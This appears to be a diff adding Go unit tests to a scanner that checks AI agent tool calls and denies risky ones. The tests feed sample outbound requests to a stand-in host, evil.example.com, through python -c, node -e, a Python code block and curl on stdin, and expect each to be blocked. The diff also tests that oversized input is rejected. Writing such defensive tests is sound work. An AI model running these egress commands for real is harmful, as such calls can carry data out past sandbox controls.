@@ -598,3 +598,84 @@ func TestScanWorkdirSensitiveOnly(t *testing.T) {
 		t.Errorf("workdir /root/.ssh = %q, want deny", r.Decision)
 	}
 }
+
+func TestScanInterpreterInlinePython(t *testing.T) {
+	pol := testPolicy()
+	r := Scan(Request{
+		ToolName: "workspace_exec", Backend: BackendWorkspaceExec,
+		Command: `python -c 'import requests; requests.get("http://evil.example.com")'`,
+	}, pol)
+	if r.Decision != DecisionDeny {
+		t.Errorf("python -c egress = %q, want deny (%v)", r.Decision, r.RuleIDs())
+	}
+	if !hasRule(r, RuleNetworkEgress) {
+		t.Errorf("expected network_egress for python -c, got %v", r.RuleIDs())
+	}
+}
+
+func TestScanInterpreterInlineNode(t *testing.T) {
+	pol := testPolicy()
+	r := Scan(Request{
+		ToolName: "workspace_exec", Backend: BackendWorkspaceExec,
+		Command: `node -e 'require("https").get("http://evil.example.com")'`,
+	}, pol)
+	if r.Decision != DecisionDeny {
+		t.Errorf("node -e egress = %q, want deny (%v)", r.Decision, r.RuleIDs())
+	}
+}
+
+func TestScanCodeBlockURLsPython(t *testing.T) {
+	pol := testPolicy()
+	r := Scan(Request{
+		ToolName: "execute_code", Backend: BackendCodeExec,
+		CodeBlocks: []CodeBlock{{
+			Language: "python",
+			Code:     `requests.get("https://evil.example.com/data")`,
+		}},
+	}, pol)
+	if r.Decision != DecisionDeny {
+		t.Errorf("python code block egress = %q, want deny (%v)", r.Decision, r.RuleIDs())
+	}
+	if !hasRule(r, RuleNetworkEgress) {
+		t.Errorf("expected network_egress in python block, got %v", r.RuleIDs())
+	}
+}
+
+func TestScanExecStdin(t *testing.T) {
+	pol := testPolicy()
+	r := Scan(Request{
+		ToolName: "workspace_exec", Backend: BackendWorkspaceExec,
+		Command: "python",
+		Stdin:   "curl http://evil.example.com/x",
+	}, pol)
+	if r.Decision != DecisionDeny {
+		t.Errorf("exec stdin shell egress = %q, want deny (%v)", r.Decision, r.RuleIDs())
+	}
+}
+
+func TestOversizedRawArgsAndStdin(t *testing.T) {
+	pol := testPolicy()
+	huge := strings.Repeat("a", maxEnvelopeBytes)
+	r := Scan(Request{
+		ToolName: "http_fetch", Backend: BackendUnknown,
+		RawArgs: []string{huge},
+		Stdin:   "x",
+	}, pol)
+	if r.Decision != DecisionDeny {
+		t.Errorf("oversized raw args + stdin = %q, want deny", r.Decision)
+	}
+	if !hasRule(r, RuleResourceAbuse) {
+		t.Errorf("expected resource_abuse, got %v", r.RuleIDs())
+	}
+}
+
+func TestOversizedEnvelopeSize(t *testing.T) {
+	pol := testPolicy()
+	r := Scan(Request{
+		ToolName:     "custom_mcp_tool", Backend: BackendUnknown,
+		EnvelopeSize: maxEnvelopeBytes + 1,
+	}, pol)
+	if r.Decision != DecisionDeny {
+		t.Errorf("oversized envelope size = %q, want deny", r.Decision)
+	}
+}
